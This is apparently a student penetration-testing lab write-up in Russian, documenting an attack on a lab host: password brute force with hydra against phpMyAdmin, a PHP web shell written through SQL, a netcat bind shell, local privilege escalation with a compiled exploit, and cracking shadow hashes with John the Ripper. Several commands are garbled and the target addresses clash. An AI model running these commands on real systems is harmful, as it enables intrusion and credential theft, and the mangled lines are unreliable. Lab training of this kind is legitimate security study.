# Лабораторная работа №3
## Исходные данные
IP адрес злоумышленника: 192.168.56.101
IP адрес атакуемого хоста: 192.168.36.102
## Сканируем хост
<img width="416" alt="image" src="https://github.com/kirasir1/toib_prak/assets/13931629/6f276657-8ebf-4e3d-8c14-d09ed25932dc"><br /><br />
<img width="413" alt="image" src="https://github.com/kirasir1/toib_prak/assets/13931629/52b6fd76-f4c9-4da8-8f08-f19c0ad193d0">
## Эксплуатируем уязвимость на хосте
`hydra -l root –P /home/exalt/Desktop/Wordlist/darkc0de.Ist –f –e ns –vV`<br /><br />
<img width="400" alt="image" src="https://github.com/kirasir1/toib_prak/assets/13931629/57872aa8-177a-454c-b9bd-f2584603ee85"><br /><br />
192.168.56.102 http-post-form *phpmyadmin/index <br /><br />
<img width="364" alt="image" src="https://github.com/kirasir1/toib_prak/assets/13931629/3291f2a2-610c-4507-ac53-bcd9397b54eb"><br /><br />
PHP: `<pre><?@system(s GET] cmd*}};?></pre>`<br /><br />
<img width="378" alt="image" src="https://github.com/kirasir1/toib_prak/assets/13931629/9b70188f-8df8-4f78-82d7-710ec663c029"><br /><br />
SQL: `SELECT * INTO DUMPFILE "/usr/local/apache/htdocs/homepage/shell.php" 	FROM hack; ` <br /><br />
<img width="326" alt="image" src="https://github.com/kirasir1/toib_prak/assets/13931629/f3d0714a-b308-47e5-ae68-63c30121c437"><br /><br />
<img width="396" alt="image" src="https://github.com/kirasir1/toib_prak/assets/13931629/6175a878-8cb4-49a7-ad6d-9aa1cc05a337"><br /><br />
Netcat: `nc -l -v -p 1234 -e /bin/bash` <br /><br />
<img width="423" alt="image" src="https://github.com/kirasir1/toib_prak/assets/13931629/4dfc5a78-6b9c-4a1d-b8b4-49630ee4cfb7">
## Повышение привилегий с помощью уязвимости Linux nullpointer exploit
`gcc -o /tmp/run /usr/local/apache/htdocs/homepage/run.c`<br /><br />
`gcc –o /tmp/exploit /usr/local/apache/htdocs/homepage/exploit.c`<br /><br />
`cd /tmp `<br /><br />
`./run`<br /><br />
<img width="438" alt="image" src="https://github.com/kirasir1/toib_prak/assets/13931629/08bb3e5f-6415-4d66-9de8-fc3b3b0e1d77"><br /><br />
<img width="435" alt="image" src="https://github.com/kirasir1/toib_prak/assets/13931629/b640a111-358c-47a2-b51a-3c3807f4e770"><br /><br />
<img width="433" alt="image" src="https://github.com/kirasir1/toib_prak/assets/13931629/2925ddfc-bb37-4a03-bd66-10081e439931">
## Получаем доступ с помощью John The Ripper 
`unshadow passwd shadow > pass.pwd `<br /><br />
`john --wordlist=-/Desktop/wordlist/darkcode.lst pass.pwd`<br /><br />
<img width="386" alt="image" src="https://github.com/kirasir1/toib_prak/assets/13931629/6d399d03-b59e-4144-a760-8c1dc8549550"><br /><br />
`ssh root@192.168.56.102`<br /><br />
<img width="411" alt="image" src="https://github.com/kirasir1/toib_prak/assets/13931629/3f1fb862-08a1-4620-87cc-79fb23a83106">
